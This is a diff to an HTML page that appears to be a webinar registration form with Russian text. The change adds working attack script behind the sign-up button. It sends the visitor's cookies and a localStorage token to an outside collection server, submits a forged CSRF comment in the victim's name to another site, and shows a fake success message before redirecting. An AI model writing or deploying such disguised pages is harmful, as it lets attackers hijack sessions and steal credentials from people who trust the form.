@@ -32,13 +32,13 @@
     button:hover {
       background-color: #2980b9;
     }
-    iframe {
-      display: none;
-    }
     .confirmation {
       margin-top: 20px;
       font-size: 16px;
       color: green;
+      display: none;
+    }
+    iframe {
       display: none;
     }
   </style>
@@ -49,20 +49,21 @@
 
   <button onclick="attack()">Записаться</button>
 
-  <div class="confirmation">✅ Вы успешно зарегистрированы!</div>
+  <div class="confirmation" id="ok">✅ Вы успешно зарегистрированы!</div>
   <iframe name="hiddenFrame"></iframe>
 
   <script>
     function attack() {
-      // Кража cookie
-  fetch("https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?cookie=" + encodeURIComponent(document.cookie));
+      // 1. Кража cookie
+      fetch("https://kazcybertoken.ct.ws/steal.php?cookie=" + encodeURIComponent(document.cookie));
 
-  // Кража токена
-  fetch("https://webhook.site/0f4c8d60-30f6-4dc3-a2ac-3dc4659012fe?token=" + localStorage.getItem("token"));
+      // 2. Кража токена из localStorage
+      const token = localStorage.getItem("token");
+      if (token) {
+        fetch("https://kazcybertoken.ct.ws/steal.php?token=" + encodeURIComponent(token));
+      }
 
-
-
-      // 2. CSRF-атака — отправка формы от имени жертвы
+      // 3. CSRF-атака — отправка комментария от имени жертвы
       const form = document.createElement("form");
       form.action = "https://kazcyber.zapto.org/comments.php";
       form.method = "POST";
@@ -73,12 +74,16 @@
       input.name = "comment";
       input.value = "💀 CSRF-комментарий от имени жертвы 💀";
       form.appendChild(input);
-
       document.body.appendChild(form);
       form.submit();
 
-      // 3. Показываем сообщение
-      document.querySelector(".confirmation").style.display = "block";
+      // 4. Показать сообщение
+      document.getElementById("ok").style.display = "block";
+
+      // 5. Переадресация через 3 секунды
+      setTimeout(() => {
+        window.location.href = "https://cyberwebinar.kz/thanks";
+      }, 3000);
     }
   </script>
 </body>
